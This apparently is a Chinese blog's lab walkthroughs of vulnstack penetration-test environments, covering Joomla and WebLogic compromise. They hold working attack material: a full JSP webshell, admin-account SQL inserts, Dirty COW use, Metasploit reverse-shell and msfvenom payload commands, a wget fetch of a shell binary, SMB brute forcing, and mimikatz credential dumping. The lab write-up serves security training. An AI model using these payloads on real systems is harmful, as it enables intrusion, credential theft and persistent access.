<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[200][text/html; charset=UTF-8][23.75kb] http://192.168.3.40/1.php                  </span><br><span class="line">[200][text/html; charset=UTF-8][0b] http://192.168.3.40/2.php                       </span><br><span class="line">[200][text/html; charset=utf-8][1.76kb] http://192.168.3.40/administrator/          </span><br><span class="line">[200][text/html; charset=utf-8][1.76kb] http://192.168.3.40/administrator/index.php </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/bin/                                   </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/cache/                                 </span><br><span class="line">[200][text/html; charset=UTF-8][0b] http://192.168.3.40/configuration.php           </span><br><span class="line">[200][None][1.88kb] http://192.168.3.40/configuration.php~                          </span><br><span class="line">[200][text/plain][1.43kb] http://192.168.3.40/htaccess.txt                          </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/includes/                              </span><br><span class="line">[200][text/html; charset=utf-8][3.91kb] http://192.168.3.40/index.php               </span><br><span class="line">[200][text/plain][6.67kb] http://192.168.3.40/LICENSE.txt                           </span><br><span class="line">[200][text/html; charset=utf-8][2.67kb] http://192.168.3.40/index.php/login/        </span><br><span class="line">[200][text/plain][1.71kb] http://192.168.3.40/README.txt                            </span><br><span class="line">[200][text/plain][392.00b] http://192.168.3.40/robots.txt                           </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/templates/                             </span><br><span class="line">[200][text/html][31.00b] http://192.168.3.40/tmp/                                   </span><br><span class="line">[200][text/plain][628.00b] http://192.168.3.40/web.config.txt     </span><br></pre></td></tr></table></figure>

<p>访问1.php发现是 phpinfo页面</p>
<p><img src="/posts/2ce9ab7f/phpinfo.png"></p>
<p>访问<code>http://192.168.3.40/configuration.php~</code>应该是配置文件的备份</p>
<p>得到数据库的账号密码</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public $dbtype = &#x27;mysqli&#x27;;</span><br><span class="line">public $host = &#x27;localhost&#x27;;</span><br><span class="line">public $user = &#x27;testuser&#x27;;</span><br><span class="line">public $password = &#x27;cvcvgjASD!@&#x27;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/posts/2ce9ab7f/sql_config.png"></p>
<p>访问<code>http://192.168.3.40/administrator/  </code>看到是Joomla! 搭建的网站，可以使用<code>joomscan</code></p>
<p><code>sudo perl joomscan.pl -u 192.168.3.40  </code></p>
<br>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库  mysql</span><br><span class="line">        账号:testuser       密码:cvcvgjASD!@</span><br><span class="line">敏感目录</span><br><span class="line">        http://192.168.3.40/1.php                 phpinfo</span><br><span class="line">        http://192.168.3.40/administrator/        后台登录页面，使用Joomla</span><br><span class="line">        http://192.168.3.40/configuration.php~    备份配置文件</span><br><span class="line">        http://192.168.3.40/robots.txt </span><br><span class="line">        http://192.168.3.40/web.config.txt  </span><br><span class="line">文件路径  	/var/www/html</span><br><span class="line">开放端口    22，25，80，110，3306</span><br><span class="line">操作系统    ubuntu16.04.1</span><br><span class="line">后台管理    使用Joomla3.9.12</span><br><span class="line">PHP版本     7.1.32</span><br><span class="line">Apache/2.4.18 (Ubuntu)</span><br><span class="line">User/Group	www-data(33)/33</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="登录mysql创建用户"><a href="#登录mysql创建用户" class="headerlink" title="登录mysql创建用户"></a>登录mysql创建用户</h4><p><code>mysql -utestuser -h 192.168.3.40 -p</code></p>
<p><img src="/posts/2ce9ab7f/mysql_conn.png"></p>
<p>有两个users表 分别为<code>am2zu_users</code>  <code>umnbt_users</code>看下这两个表中有什么有用信息利用</p>
<p><img src="/posts/2ce9ab7f/select_user1.png"></p>
<p><img src="/posts/2ce9ab7f/select_user2.png"></p>
<p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">Joomal通过数据库添加新超级管理员</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `am2zu_users` (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`) VALUES (&#x27;Administrator2&#x27;, &#x27;admin2&#x27;, &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW()); </span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`) VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/login_error.png"></p>
<p>创建完发现无法登录，重新创建了一个 <code>admin3</code>  <code>secret</code>成功进入后台</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO `am2zu_users`</span><br><span class="line">   (`name`, `username`, `password`, `params`, `registerDate`, `lastvisitDate`, `lastResetTime`)</span><br><span class="line">VALUES (&#x27;Administrator3&#x27;, &#x27;admin3&#x27;,</span><br><span class="line">    &#x27;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#x27;, &#x27;&#x27;, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">INSERT INTO `am2zu_user_usergroup_map` (`user_id`,`group_id`)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#x27;8&#x27;);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/login_success.png"></p>
<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>在Extensions中选择Beez3模板，然后点击New File 创建一个shell.php</p>
<p><img src="/posts/2ce9ab7f/beez3.png"></p>
<p><img src="/posts/2ce9ab7f/create_shell_php.png"></p>
<p><img src="/posts/2ce9ab7f/shell.png"></p>
<p>shell.php在templates/beez3目录下</p>
<p>访问验证是否成功上传shell</p>
<p><img src="/posts/2ce9ab7f/shell_success.png"></p>
<h4 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h4><h5 id="蚁剑disable-functions插件"><a href="#蚁剑disable-functions插件" class="headerlink" title="蚁剑disable_functions插件"></a>蚁剑disable_functions插件</h5><p>使用蚁剑连接shell，在执行命令时，不论写什么都只会返回<code>ret=127</code></p>
<p><img src="/posts/2ce9ab7f/ret_127.png"></p>
<p><img src="/posts/2ce9ab7f/disable_func.png"></p>
<p>使用蚁剑的disable_functions插件，选择<code>PHP7_GC_UAF</code> 成功执行命令</p>
<p><img src="/posts/2ce9ab7f/shell_exec.png"></p>
<h5 id="使用LD-PRELOAD绕过"><a href="#使用LD-PRELOAD绕过" class="headerlink" title="使用LD_PRELOAD绕过"></a>使用LD_PRELOAD绕过</h5><p>工具下载地址：<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>使用蚁剑上传 bypass_diablefunc.php 和 bypass_diablefunc_x64.so 到 /templates/beez3/</p>
<p>访问<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php</code></p>
<p>payload:<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/test&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</code></p>
<p><img src="/posts/2ce9ab7f/LD_PRELOAD.png"></p>
<h4 id="敏感信息收集"><a href="#敏感信息收集" class="headerlink" title="敏感信息收集"></a>敏感信息收集</h4><p><code>ifconfig </code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:ab:32:ac  </span><br><span class="line">          inet addr:192.168.93.120  Bcast:192.168.93.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:feab:32ac/64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:145075 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:86884 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:17884352 (17.8 MB)  TX bytes:24388894 (24.3 MB)</span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1/128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:380140 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:380140 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:28142732 (28.1 MB)  TX bytes:28142732 (28.1 MB)</span><br></pre></td></tr></table></figure>

<p>使用蚁剑访问下/home 和 /tmp文件下内容 ，发现/tmp/mysql/test.txt，内容为下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adduser sswwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure>

<p><code>uname -a </code>查看内核版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>

<p><code>cat /etc/passwd</code> 查看用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false</span><br><span class="line">syslog:x:104:108::/home/syslog:/bin/false</span><br><span class="line">_apt:x:105:65534::/nonexistent:/bin/false</span><br><span class="line">lxd:x:106:65534::/var/lib/lxd/:/bin/false</span><br><span class="line">messagebus:x:107:111::/var/run/dbus:/bin/false</span><br><span class="line">uuidd:x:108:112::/run/uuidd:/bin/false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false</span><br><span class="line">yy:x:1000:1000:yy,,,:/home/yy:/bin/bash</span><br><span class="line">sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">www:x:1001:1001::/home/www:/sbin/nologin</span><br></pre></td></tr></table></figure>

<p><code>netstat -ano</code> 查看开放端口，看到开放了22 80和3306</p>
<p>尝试刚才在tmp中找到的账号登录ssh，成功登录</p>
<p><code>ssh wwwuser@192.168.3.42 -p 22</code>  <code>wwwuser_123Aqx</code></p>
<p><img src="/posts/2ce9ab7f/ssh_login.png"></p>
<p>查看ip时发现和蚁剑shell上的ip不同，是另一台机器，应该使用到的是nginx反向代理</p>
<h4 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h4><p>使用脏牛提权</p>
<p>下载地址:<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
<p>将dirty.c上传到蚁剑 使用wget下载</p>
<p><img src="/posts/2ce9ab7f/wget_dirtyc.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">./dirty test123</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/dirtycow.png"></p>
<p>成功提权为firefart权限</p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h4><p>使用exploit/multi/script/web_delivery</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set target 7    # 选择目标系统 可以show targets 查看 7是linux</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.3.43  # kali的ip</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/msf_web_delivery.png"><br>复制payload到目标机器运行，得到反弹shell<br><img src="/posts/2ce9ab7f/msf_web_delivery2.png"></p>
<hr>
<p>当然也可以用msfvenom生成shell</p>
<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.42 LPORT=4444 -f elf &gt; shell.elf</code></p>
<p>使用蚁剑上传，然后再centos机器上下载shell</p>
<p><code>wget  http://192.168.3.42/templates/beez3/shell.elf</code></p>
<p><code>chmod +x shell.elf</code></p>
<p>在kali上开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler </span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost kali的ip</span><br><span class="line">lhost =&gt; 192.168.3.43</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 4444</span><br><span class="line">lport =&gt; 4444</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>

<h4 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h4><p><code> use post/multi/manage/autoroute</code></p>
<p><img src="/posts/2ce9ab7f/autoroute.png"></p>
<h4 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h4><p><code>use auxiliary/server/socks_proxy</code></p>
<p><code>sudo vim /etc.proxychains4.conf</code> 修改为 socks 127.0.0.1</p>
<h4 id="存活主机探测"><a href="#存活主机探测" class="headerlink" title="存活主机探测"></a>存活主机探测</h4><h5 id="利用icmp协议探测存活主机"><a href="#利用icmp协议探测存活主机" class="headerlink" title="利用icmp协议探测存活主机"></a>利用icmp协议探测存活主机</h5><p><code>for k in $( seq 1 255);do ping -c 1 192.168.93.$k|grep &quot;ttl&quot;|awk -F &quot;[ :]+&quot; &#39;&#123;print $4&#125;&#39;; done</code> 扫到5台存活主机</p>
<p><img src="/posts/2ce9ab7f/icmp.png"></p>
<h5 id="smb扫描"><a href="#smb扫描" class="headerlink" title="smb扫描"></a>smb扫描</h5><p><code>use auxiliary/scanner/smb/smb_version</code></p>
<p><code> set rhosts 192.168.93.0/24</code></p>
<p><code>set thread 10</code></p>
<p><code>run</code></p>
<p>扫到3台windows机器</p>
<p><img src="/posts/2ce9ab7f/smb_10.png"></p>
<p><img src="/posts/2ce9ab7f/smb_20.png"></p>
<p><img src="/posts/2ce9ab7f/smb_30.png"></p>
<p>所以域内的5台主机都可以确定了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.93.10	windows 2012</span><br><span class="line">192.168.93.20	windows 2008</span><br><span class="line">192.168.93.30	windows 7	</span><br><span class="line">192.168.93.100  centos</span><br><span class="line">192.168.93.120  ubuntu(nginx反向代理)</span><br></pre></td></tr></table></figure>

<h4 id="内网主机端口探测"><a href="#内网主机端口探测" class="headerlink" title="内网主机端口探测"></a>内网主机端口探测</h4><p>使用nmap扫描一下内网中的3台windows主机开放的端口.</p>
<p><code>proxychains4 nmap 192.168.93.10 -Pn -sT -sV -F</code></p>
<p><img src="/posts/2ce9ab7f/nmap_10.png"></p>
<p>同样的方法扫一下20 30 主机</p>
<p><img src="/posts/2ce9ab7f/nmap_20.png"></p>
<p><img src="/posts/2ce9ab7f/nmap_30.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.93.10     80.135.139.445          win2012</span><br><span class="line">192.168.93.20     80,135,139,445,1433     win2008R2</span><br><span class="line">192.168.93.30     135,139,445             win7</span><br></pre></td></tr></table></figure>

<h4 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h4><p>使用ms17-010扫一波漏洞</p>
<p><code>use /scanner/smb/smb_ms17_010</code></p>
<p><img src="/posts/2ce9ab7f/ms17-010.png"></p>
<p>没有发现漏洞</p>
<h4 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h4><p>先爆破一下win2008R2主机的mssql smb</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set rhosts 192.168.93.20</span><br><span class="line">set SMBUser administrator</span><br><span class="line">set PASS_FILE /usr/share/wordlists/PASSWORD_top1000.txt</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p>自己跑没跑出密码了….看了其他师傅跑出来的密码是<code>123qwe!ASD</code></p>
<h4 id="使用wmi连接shell"><a href="#使用wmi连接shell" class="headerlink" title="使用wmi连接shell"></a>使用wmi连接shell</h4><p><code>proxychains4 python2 wmiexec.py  &#39;administrator:123qwe!ASD@192.168.93.20&#39;</code></p>
<p>成功连接20主机的shell</p>
<p><img src="/posts/2ce9ab7f/wmiexec_shell_20.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ipconfig /all</span><br><span class="line">tasklist -V</span><br><span class="line">net view </span><br><span class="line">net view /domain</span><br><span class="line">systeminfo</span><br><span class="line"></span><br><span class="line">域控是192.168.93.10 </span><br><span class="line">域内有三台机器  \\WIN-8GA56TNV3MV                                                              </span><br><span class="line">                \\WIN2008                                                                      </span><br><span class="line">                \\WIN7    </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="使用smbclient上传mimikatz"><a href="#使用smbclient上传mimikatz" class="headerlink" title="使用smbclient上传mimikatz"></a>使用smbclient上传mimikatz</h4><p><code>proxychains4 smbclient //192.168.93.20/C$ -U administrator</code></p>
<p><img src="/posts/2ce9ab7f/smbclient.png"></p>
<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1.log</code></p>
<p><img src="/posts/2ce9ab7f/logonpasswords.png"></p>
<p>得到域控账号密码 <code>Administrator</code>   <code>zxcASDqw123!!</code></p>
<h4 id="使用ipc连接域控"><a href="#使用ipc连接域控" class="headerlink" title="使用ipc连接域控"></a>使用ipc连接域控</h4><p><code>net use \\192.168.93.10\ipc$ zxcASDqw123!! /user:&quot;TEST\Administrator&quot;</code></p>
<p><img src="/posts/2ce9ab7f/ipc_flag.png"></p>
<p>得到flag</p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack2靶场</title>
    <url>/posts/8a9ea0cb/</url>
    <content><![CDATA[<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>统一登录密码 <code>1qaz@WSX</code></p>
<p>Web密码错误的，在快照管理器里面选择转到1.3即可,默认为空，然后修改密码为统一密码</p>
<p>然后再web主机上开启Weblogic服务</p>
<p><img src="/posts/8a9ea0cb/start_weblogic.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dc    仅主机  10.10.10.10</span><br><span class="line">web   仅主机  10.10.10.80   NAT 192.168.0.80</span><br><span class="line">pc    仅主机  10.10.10.201  NAT 192.168.0.201</span><br><span class="line">kali  NAT     192.168.0.128</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="nmap扫描端口"><a href="#nmap扫描端口" class="headerlink" title="nmap扫描端口"></a>nmap扫描端口</h4><p>用kaliping不通web主机，应该是开启了防火墙禁止了icmp</p>
<p><code>sudo nmap 192.168.0.80 -sV</code></p>
<blockquote>
<p>PORT      STATE SERVICE       VERSION<br>80/tcp    open  http          Microsoft IIS httpd 7.5<br>135/tcp   open  msrpc         Microsoft Windows RPC<br>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn<br>445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds<br>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2008 R2 10.50.4000; SP2<br>3389/tcp  open  ms-wbt-server Microsoft Terminal Service<br>7001/tcp  open  http          Oracle WebLogic Server 10.3.6.0 (Servlet 2.5; JSP 2.1; T3 enabled)<br>49152/tcp open  msrpc         Microsoft Windows RPC<br>49153/tcp open  msrpc         Microsoft Windows RPC<br>49154/tcp open  msrpc         Microsoft Windows RPC<br>49155/tcp open  msrpc         Microsoft Windows RPC<br>49156/tcp open  msrpc         Microsoft Windows RPC</p>
</blockquote>
<p><img src="/posts/8a9ea0cb/nmap.png"></p>
<p>先从7001的weblogic下手，使用WeblogicScan扫描一下是否存在漏洞</p>
<p><img src="/posts/8a9ea0cb/weblogicscan.png"></p>
<p>得到后台路径为<code>http://192.168.0.80:7001/console/login/LoginForm.jsp</code></p>
<p>检测到存在<code>CVE20192725</code> 和 ssrf漏洞</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="利用ssrf漏洞进行端口探测"><a href="#利用ssrf漏洞进行端口探测" class="headerlink" title="利用ssrf漏洞进行端口探测"></a>利用ssrf漏洞进行端口探测</h4><p>存在位置<code>http://192.168.0.80:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
<p>抓包测试</p>
<p><img src="/posts/8a9ea0cb/ssrf1.png"></p>
<p>此处的operator为可控点，输入一个存在的端口<code>127.0.0.1:7001</code> 会返回一个状态码</p>
<p><img src="/posts/8a9ea0cb/ssrf_7001.png"></p>
<p>输入一个不存在的端口时<code>192.168.0.80:1234</code> 会返回<code>but could not connect over HTTP to server</code></p>
<p><img src="/posts/8a9ea0cb/ssrf_1234.png"></p>
<p>输入<code>127.0.0.1:6379</code> 返回<code>but could not connect over HTTP to server</code>说明没有开放6379端口，没法继续利用去弹redis shell</p>
<p><img src="/posts/8a9ea0cb/ssrf_6379.png"></p>
<p><a href="https://www.cnblogs.com/bmjoker/p/9759761.html">weblogic ssrf利用</a></p>
<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>直接使用6哥师傅的java反序列化终极测试工具.</p>
<p><img src="/posts/8a9ea0cb/java_tool1.png"></p>
<p><img src="/posts/8a9ea0cb/java_tool2.png"></p>
<p><a href="https://www.cnblogs.com/sstfy/p/10350915.html">weblogic上传木马时路径选择</a></p>
<p>1.把shell写到控制台images目录中</p>
<p><code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code></p>
<p>访问<code>http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp</code></p>
<p>2.写到uddiexplorer目录中</p>
<p><code>C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\uddiexplorer\随机字符\war\shell.jsp</code></p>
<p>访问<code>http://*.*.*.*:7001/uddiexplorer/shell.jsp</code></p>
<p>3.写到应用安装目录中</p>
<p><code>C:\Oracle\Middleware\user_projects\domains\application\servers\AdminServer\tmp\_WL_user\项目名\随机字符\war\shell.jsp</code></p>
<p>访问<code>http://*.*.*.*:7001/项目名/shell.jsp</code></p>
<p>上传蚁剑的jsp马。密码为ant</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    class U extends ClassLoader &#123;</span><br><span class="line">        U(ClassLoader c) &#123;</span><br><span class="line">            super(c);</span><br><span class="line">        &#125;</span><br><span class="line">        public Class g(byte[] b) &#123;</span><br><span class="line">            return super.defineClass(b, 0, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public byte[] base64Decode(String str) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">            return (byte[]) clazz.getMethod(&quot;decodeBuffer&quot;, String.class).invoke(clazz.newInstance(), str);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            Class clazz = Class.forName(&quot;java.util.Base64&quot;);</span><br><span class="line">            Object decoder = clazz.getMethod(&quot;getDecoder&quot;).invoke(null);</span><br><span class="line">            return (byte[]) decoder.getClass().getMethod(&quot;decode&quot;, String.class).invoke(decoder, str);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String cls = request.getParameter(&quot;ant&quot;);</span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/8a9ea0cb/uploade_shell.png"></p>
<p>使用蚁剑进行连接</p>
<p><img src="/posts/8a9ea0cb/ant_conn.png"></p>
<p>然后可以使用<code>As-Exploits</code>插件</p>
<p>发现该机器上有安装360</p>
<h4 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h4><p>在CS上创建listener 生成cs.exe后使用蚁剑运行，beacon成功上线</p>
<p><img src="/posts/8a9ea0cb/cs1.png"></p>
<h5 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看当前用户sid  shell whoami /user</span><br><span class="line">查看系统信息  shell systeminfo</span><br><span class="line">查看域名      shell net config workstation</span><br><span class="line">查看域内用户  shell net user /domain</span><br><span class="line">查看机器信息  net computers </span><br><span class="line">查看域内主机  shell net view</span><br><span class="line">查看有几个域  shell net view /domain</span><br><span class="line">查看域管理员  shell net group &quot;domain admins&quot; /domain  </span><br><span class="line">查看域控      shell net group &quot;domain controllers&quot; /domain  </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>shell whoami /user</code></p>
<p><img src="/posts/8a9ea0cb/cs_whoami_user.png"></p>
<p><code>shell systeminfo</code></p>
<p><img src="/posts/8a9ea0cb/cs_systeminfo.png"></p>
<p><code>shell net config workstation</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_config_workstation.png"></p>
<p><code>shell net user /domain</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_user_domain.png"></p>
<p><code>net computers</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_computers.png"></p>
<p>使用CS的portscan模块扫描域内主机端口</p>
<p><img src="/posts/8a9ea0cb/cs_portscan.png"></p>
<p>关闭防火墙<code>netsh advfirewall set allprofiles state off</code></p>
<p><code>shell net view </code> 发现报错6118，在网上查了下是因为没有开启<code>Computer Brower</code>服务，去看了下，web服务器把该服务禁止了，开启后就可以正常使用了（因为刚才是的时候web服务器密码登录不上去，然后切换了快照，手动开启了web服务）</p>
<p><img src="/posts/8a9ea0cb/cs_net_view.png"></p>
<p><code>shell net group &quot;domain admins&quot; /domain</code></p>
<p><code>shell net group &quot;domain controllers&quot; /domain </code></p>
<p><img src="/posts/8a9ea0cb/cs_shell_net_group.png"></p>
<p>使用CS的<code>run_mimikatz</code>模块</p>
<p><img src="/posts/8a9ea0cb/cs_run_mimikatz.png"></p>
<p>得到凭据信息，密码为<code>1qaz@WSX</code></p>
<p><img src="/posts/8a9ea0cb/cs_credentials.png"></p>
<h4 id="创建用户登录3389"><a href="#创建用户登录3389" class="headerlink" title="创建用户登录3389"></a>创建用户登录3389</h4><p>查看3389是否开放</p>
<p><img src="/posts/8a9ea0cb/cs_nerstat_3389.png"></p>
<p><img src="/posts/8a9ea0cb/cs_new_user.png"></p>
<p>添加用户到管理员权限 <code>shell net localgroup administrators Mamor /add</code></p>
<p><img src="/posts/8a9ea0cb/cs_net_localgroup_administrators_Mamor_add.png"></p>
